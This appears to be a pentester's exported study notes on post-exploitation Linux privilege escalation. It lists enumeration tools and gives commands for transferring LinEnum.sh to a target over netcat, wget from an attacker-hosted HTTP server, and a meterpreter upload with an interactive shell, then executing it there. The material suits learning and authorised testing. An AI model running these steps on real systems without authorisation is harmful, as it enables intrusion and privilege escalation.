<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Automated Recon with Tools</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Automated Recon with Tools</h1><br/><br />While automated scripts can be really useful and time-saving there&#39;s also a flipside to that coin.<br />Automated vulnerability scanners and scripts usually rely on a database of known vulnerabilities which is only as valid as the last update. Using outdated vulnerability databases with automated scanning tools will result in overlooking any recently discovered vulnerabilities.<br />Moreover is important to run more than one tool:<br />1. <a href="Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--LinEnum.sh.html">LinEnum.sh</a><br />2. <a href="Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--linpeas.sh.html">linpeas.sh</a><br />3. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">lse.sh</a><br />4. Traitor (<a href="https://github.com/liamg/traitor)">https://github.com/liamg/traitor)</a>. Automate exploitation.<br /><br /><strong>Transfer an automated tool from the attacker to the target</strong><br />• <span style="text-decoration:underline;">netcat</span><br />    all traffic with netcat is unencrypted and may be detected by Intrusion Detection Systems or other anomalous traffic detection mechanisms implemented within an organization.<br />    It’s a quick, easy way to get files from one system to another, but not stealthy in any way. <br />   1) Target machine<br />       sets up a listener on the target to redirect incoming data (&gt;) to a new file<br />       <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ nc -l -p 1234 &gt; LinEnum.sh </pre></div><br />   2) Attacker machine<br />        connect to our target system while redirecting the contents of LinEnum.sh to the target<br />       <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -w 3 &lt;target_ip&gt; 1234 &lt; LinEnum.sh</pre></div><br />   3) set the executable bit<br />       <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ <span style="color:#ff9d00;font-weight:700">chmod</span> +x LinEnum.sh</pre></div><br /><br />• <span style="text-decoration:underline;">wget</span><br />    attacker machine<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>rebootuser<span style="color:#ff9d00;font-weight:700">/</span>LinEnum<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh  <span style="color:#0088ff;font-weight:400">#need to be root to Download</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">ls</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python3 -m http.server 80 -d <span style="color:#ff9d00;font-weight:700">/</span>tmp  <span style="color:#0088ff;font-weight:400">#need to be root, Set up HTTP server on the folder where we have saved the payload </span></pre></div><br />    target machine<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ <span style="color:#ff9d00;font-weight:700">wget</span> http<span style="color:#ff9d00;font-weight:700">://</span>&lt;IpAttacker&gt;<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh   <span style="color:#0088ff;font-weight:400">#Download from the target machine</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ <span style="color:#ff9d00;font-weight:700">chmod</span> +x LinEnum.sh<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ .<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh         <span style="color:#0088ff;font-weight:400">#Execute</span></pre></div><br /><br />• <span style="text-decoration:underline;">metasploit</span><br />    <div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>rebootuser<span style="color:#ff9d00;font-weight:700">/</span>LinEnum<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh      <span style="color:#0088ff;font-weight:400">#first we have to download the script</span><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ msfconsole                                                                       <span style="color:#0088ff;font-weight:400">#run metasploit</span><br />msf&gt; spool <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>LinEnumOutput.txt                                               <span style="color:#0088ff;font-weight:400">#save all output of metasploit on file</span><br />meterpreter &gt; upload <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh <span style="color:#ff9d00;font-weight:700">.</span>                                          <span style="color:#0088ff;font-weight:400">#upload the scripts in the current directory(.)</span><br />meterpreter &gt; execute -f <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span> -i -c                                                        <span style="color:#0088ff;font-weight:400">#shell on the linux target machine</span><br />shell&gt; <span style="color:#ff9d00;font-weight:700">chmod</span> +x LinEnum.sh                                                                    <span style="color:#0088ff;font-weight:400">#make executable the file</span><br />shell&gt; .<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh                                                                           <span style="color:#0088ff;font-weight:400">#run the script</span><br />CTRL+C                                                                                        <span style="color:#0088ff;font-weight:400">#exit shell</span><br />CTRL+Z                                                                                        <span style="color:#0088ff;font-weight:400">#background meterpreter</span><br />msf&gt; spool off                                                                                <span style="color:#0088ff;font-weight:400">#end to save on file</span><br /></pre></div><br /><br /><strong>Bibliography:</strong><br />• TCM Security: Linux Privilege Escalation for Beginners (<a href="https://academy.tcm-sec.com/p/linux-privilege-escalation">https://academy.tcm-sec.com/p/linux-privilege-escalation</a>)<br />• Tib3rius: Linux Privilege Escalation for OSCP &amp; Beyond! (<a href="https://www.udemy.com/course/linux-privilege-escalation/">https://www.udemy.com/course/linux-privilege-escalation/</a>)<br /></div>
</body>
</html>
